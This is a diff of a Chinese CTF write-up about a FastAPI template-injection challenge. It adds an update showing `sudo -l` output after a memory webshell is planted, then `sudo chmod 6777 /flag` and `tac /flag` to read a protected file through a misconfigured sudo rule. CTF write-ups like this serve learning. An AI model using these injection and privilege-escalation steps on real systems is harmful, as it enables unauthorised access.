@@ -284,13 +284,25 @@ lipsum.__globals__['__builtins__']['eval']
 
 依旧没有任何问题。
 
-这样就完美地解决了这个题目。
+**(2025/11/17 update)**
 
-PS：NSS上这个题环境应该还没搞好，读/flag显示为空，environ的flag也不对：
+在NSS评论区看到了出题人的出题记录，原来是权限不够，打入内存马以后尝试`sudo -l`
 
-![image-20251113102933368](/assets/img/post/fastapi-trojan/image-20251113102933368.png)
+```bash
+Matching Defaults entries for ctf_user on 8393adbbb4774dec:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
 
+User ctf_user may run the following commands on 8393adbbb4774dec:
+    (ALL) NOPASSWD: /usr/bin/chmod
 
+```
+
+那就使用chmod去给/flag提权即可。
+
+```bash
+sudo chmod 6777 /flag	//赋予flag权限
+tac /flag
+```
 
 
 
